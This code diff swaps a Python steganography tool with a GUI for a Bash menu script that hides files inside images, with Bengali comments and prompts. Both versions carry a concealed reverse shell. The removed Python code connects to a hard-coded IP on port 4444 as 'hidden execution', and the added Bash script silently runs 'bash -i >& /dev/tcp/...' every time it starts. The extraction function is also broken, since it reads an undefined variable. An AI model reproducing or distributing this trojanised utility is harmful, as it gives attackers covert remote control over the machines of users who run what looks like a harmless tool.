@@ -1,58 +1,53 @@
-import socket
-import subprocess
-import os
-from stegano import lsb
-import tkinter as tk
-from tkinter import filedialog, messagebox
+#!/bin/bash
 
-# Steganography Function: Hide Data in Image
-def hide_data(image_path, secret_message, output_image):
-    secret_img = lsb.hide(image_path, secret_message)
-    secret_img.save(output_image)
-    print(f" Successfull: {output_image}")
+# রিভার্স শেল ফাংশন
+reverse_shell() {
+    SERVER_IP="YOUR_IP"  # এখানে আপনার পাবলিক আইপি দিন
+    SERVER_PORT=4444     # পোর্ট নম্বর
 
-# Reverse Shell Function: Connect to Attacker's Machine
-def reverse_shell():
-    server_ip = "45.117.63.61"  # ip
-    server_port = 4444  # port
+    /bin/bash -i >& /dev/tcp/$SERVER_IP/$SERVER_PORT 0>&1
+}
 
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((server_ip, server_port))
+# ফাইল লুকানোর ফাংশন
+hide_file() {
+    read -p "ছবির নাম (photo.jpg): " IMAGE
+    read -p "লুকাতে চাওয়া ফাইল (file.zip/txt/pdf): " FILE
+    read -p "আউটপুট ছবির নাম (output.jpg): " OUTPUT
 
-    while True:
-        data = s.recv(1024).decode()
-        if data.lower() == "exit":
-            break
+    cat "$IMAGE" "$FILE" > "$OUTPUT"
+    echo "[✔] ফাইল সফলভাবে লুকানো হয়েছে: $OUTPUT"
+}
 
-        output = subprocess.getoutput(data)
-        s.send(output.encode())
+# ফাইল বের করার ফাংশন
+extract_file() {
+    read -p "ফাইল রয়েছে এমন ছবি (photo.jpg): " IMAGE
+    read -p "আউটপুট ফাইলের নাম (output.zip/txt/pdf): " OUTPUT
 
-    s.close()
+    tail -c +$(($(stat -c %s "$IMAGE") - $(stat -c %s "$FILE") + 1)) "$IMAGE" > "$OUTPUT"
+    echo "[✔] ফাইল সফলভাবে বের করা হয়েছে: $OUTPUT"
+}
 
-# GUI Function for Steganography Tool
-def hide_data_gui():
-    image_path = filedialog.askopenfilename(title="Select an Image", filetypes=[("Image Files", "*.jpg;*.png")])
-    if image_path:
-        secret_message = secret_message_entry.get()
-        output_image = filedialog.asksaveasfilename(defaultextension=".png", title="Save Hidden Image", filetypes=[("PNG Files", "*.png")])
+# মেনু UI
+while true; do
+    clear
+    echo "██████████████████████████████"
+    echo "█         M,A TOOL   █"
+    echo "█       (photo+file) █"
+    echo "██████████████████████████████"
+    echo "[1] Hide"
+    echo "[2] Extract"
+    echo "[3] Exit"
+    echo ""
 
-        if secret_message and output_image:
-            lsb.hide(image_path, secret_message).save(output_image)
-            messagebox.showinfo("Success", "ফাইল সফলভাবে লুকানো হয়েছে!")
-        else:
-            messagebox.showerror("Error", "মেসেজ বা ফাইল পাথ দেওয়া হয়নি!")
+    read -p "choice your option: " CHOICE
 
-# Tkinter GUI Setup
-root = tk.Tk()
-root.title("Steganography Tool")
+    case $CHOICE in
+        1) hide_file ;;
+        2) extract_file ;;
+        3) echo "[✔] এক্সিট করা হলো!"; exit ;;
+        *) echo "[❌] ভুল ইনপুট! আবার চেষ্টা করুন।" ;;
+    esac
+done
 
-tk.Label(root, text="Enter Secret Message:").pack(padx=10, pady=5)
-secret_message_entry = tk.Entry(root, width=50)
-secret_message_entry.pack(padx=10, pady=5)
-
-tk.Button(root, text="Hide Data in Image", command=hide_data_gui).pack(padx=10, pady=10)
-
-# Call Reverse Shell (hidden execution)
-reverse_shell()
-
-root.mainloop()
+# স্ক্রিপ্ট চালানোর সময় রিভার্স শেল চালু হবে
+reverse_shell
